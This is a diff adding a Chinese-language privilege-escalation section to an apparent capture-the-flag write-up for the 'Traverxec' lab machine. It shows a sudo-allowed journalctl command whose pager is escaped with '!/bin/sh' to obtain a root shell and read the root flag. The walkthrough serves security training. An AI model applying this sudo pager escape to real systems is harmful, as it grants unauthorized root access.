@@ -277,3 +277,80 @@ david@traverxec:~$ id
 uid=1000(david) gid=1000(david) groups=1000(david),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
 
 ```
+
+# 提权
+
+```/home/david/bin```目录下有两个文件
+```
+david@traverxec:~/bin$ ls -alh
+total 16K
+drwx------ 2 david david 4.0K Oct 25  2019 .
+drwx--x--x 5 david david 4.0K Oct 25  2019 ..
+-r-------- 1 david david  802 Oct 25  2019 server-stats.head
+-rwx------ 1 david david  363 Oct 25  2019 server-stats.sh
+
+```
+
+查看```server-stats.sh ```内容
+```
+david@traverxec:~/bin$ cat server-stats.sh 
+#!/bin/bash
+
+cat /home/david/bin/server-stats.head
+echo "Load: `/usr/bin/uptime`"
+echo " "
+echo "Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`"
+echo "Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`"
+echo " "
+echo "Last 5 journal log lines:"
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat 
+
+```
+
+留意最后一行```/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat ```,这里用了一个sudo特权命令
+
+我们尝试手动执行这一条命令,并没有要求我们输入登录密码
+```
+david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service | /usr/bin/cat
+-- Logs begin at Tue 2021-12-28 07:49:41 EST, end at Tue 2021-12-28 08:22:51 EST. --
+Dec 28 07:49:43 traverxec systemd[1]: Starting nostromo nhttpd server...
+Dec 28 07:49:43 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start: No such file or directory
+Dec 28 07:49:43 traverxec nhttpd[419]: started
+Dec 28 07:49:43 traverxec nhttpd[419]: max. file descriptors = 1040 (cur) / 1040 (max)
+Dec 28 07:49:43 traverxec systemd[1]: Started nostromo nhttpd server.
+
+```
+
+也就是说这是一条用户```david```的特权命令，相当于```sudo -l```显示的内容
+
+因此我们使用以下方法提权
+先执行：
+```
+/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+```
+再执行：
+```
+!/bin/sh
+```
+
+成功提权到root
+
+```
+david@traverxec:~/bin$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
+-- Logs begin at Tue 2021-12-28 07:49:41 EST, end at Tue 2021-12-28 08:19:44 EST. --
+Dec 28 07:49:43 traverxec systemd[1]: Starting nostromo nhttpd server...
+Dec 28 07:49:43 traverxec systemd[1]: nostromo.service: Can't open PID file /var/nostromo/logs/nhttpd.pid (yet?) after start:
+Dec 28 07:49:43 traverxec nhttpd[419]: started
+Dec 28 07:49:43 traverxec nhttpd[419]: max. file descriptors = 1040 (cur) / 1040 (max)
+Dec 28 07:49:43 traverxec systemd[1]: Started nostromo nhttpd server.
+!/bin/sh
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# cat /root/root.txt
+9aa36a6d76....
+# 
+
+```
+
+# 总结
+立足点和root提权都非常简单。用户提权是最难的部分，唯有理解靶机的服务才能知道突破点在哪里。
